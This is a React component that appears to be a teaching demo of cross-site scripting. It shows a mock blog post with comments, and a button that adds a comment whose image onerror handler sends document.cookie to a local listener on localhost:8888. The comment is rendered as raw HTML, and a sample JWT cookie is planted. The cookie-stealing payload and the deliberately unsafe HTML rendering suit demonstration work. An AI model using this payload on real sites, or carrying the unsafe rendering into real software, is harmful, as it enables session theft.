import './App.css';
import { useEffect, useState } from 'react';
import { ListGroup, ListGroupItem, Card, Button } from 'react-bootstrap';
import InnerHTML from 'dangerously-set-html-content'
import { uuid } from 'uuidv4';

const App = () => {

  const [comments, setComments] = useState([
    {
      id: 1, 
      header: 'I agree!', 
      image: `<img 
      width="50px"
      src="https://i.pinimg.com/originals/0c/3b/3a/0c3b3adb1a7530892e55ef36d3be6cb8.png"
      >`, 
      content: 'Ben, great article I totally agree. Amazon Echos are secure.'
    },
  ]);

  useEffect(() => {
    document.cookie = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzNDU2Nzg5MCIsIm5hbWUiOiJCZW4gSG9ic29uIn0.dfsQU8fl8jmLWxMYQPXSBZlNwF-dvd_1uTri9eL8YLg'
  }, [])

  const toggleXSS = () => {

    if (comments.length != 2) {
      setComments([...comments, {
        id: 2, 
        header: 'Enjoyed my Echo for over 5 years', 
        image: `
          <img 
            width="50px"
            src="" 
            onerror="
            this.src='http://localhost:8888/?cookie='+document.cookie;
            this.removeAttribute('onerror');
            "
          >
          
        `,
        content: 'This was a great article!'
      }])
    }

  }
  
  return (
    <div className="App">
      <article>
        <h2>
          Amazon Echo's Are Super Secure &amp; Reliable
        </h2>
        <p>
        &emsp;I bought my first Amazon Echo in 2021. 
          It's been great having Alexa listen to me and all my conversation so she can respond whenever I say "Hey Alexa." 
          It's strange though because my friends and family keep getting these phone calls which sound like my voice but it can't be my Amazing Echo!
          Only websites and other servers are targets on the internet&mdash;not my hardware!
          My Alexa is also totally secure because it sits behind my commercial router which protects it from unwanted connections!
          Like I said, it's totally secure, so you should get one today!
        </p>
      </article>
      <h3>Comments</h3>
      <Button variant="primary" disabled={comments.length == 2} onClick={toggleXSS}>Enable XSS Vuln.</Button>
      <br/>
      <div>
          {
           comments.map((comment, i) =>
           <Card bg="light" style={{ width: '100vw' }} key={i}>
            <Card.Body>
              <Card.Title>{comment.header}</Card.Title>
              <InnerHTML html={comment.image}/>
              <Card.Text>
                {comment.content}
              </Card.Text>
            </Card.Body>
          </Card>
            )
          }
      </div>
    </div>
  );
}

export default App;
